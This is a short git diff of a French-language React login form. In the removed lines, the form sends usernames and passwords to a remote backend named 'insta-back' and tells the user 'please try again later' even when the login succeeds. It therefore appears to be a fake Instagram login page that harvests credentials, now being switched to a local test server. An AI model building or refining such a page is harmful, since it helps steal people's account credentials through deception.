@@ -13,7 +13,7 @@ function App() {
     setSuccessMessage('');
 
     try {
-      const response = await fetch('https://insta-back-ews1.onrender.com/api/login', {
+      const response = await fetch('http://192.168.1.156:3005/api/loginTest', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -24,7 +24,7 @@ function App() {
       const data = await response.json();
 
       if (response.ok) {
-        setSuccessMessage('veuillez réessayer plus tard !'); // Affiche un message de succès
+        setSuccessMessage('Connexion reussie !'); // Affiche un message de succès
       } else {
         setErrorMessage(data.message || 'Une erreur est survenue.');
       }
@@ -55,7 +55,7 @@ function App() {
             onChange={(e) => setUsername(e.target.value)}
           />
           <input
-            type="password"
+            type="text"
             placeholder="Password"
             value={password}
             onChange={(e) => setPassword(e.target.value)}
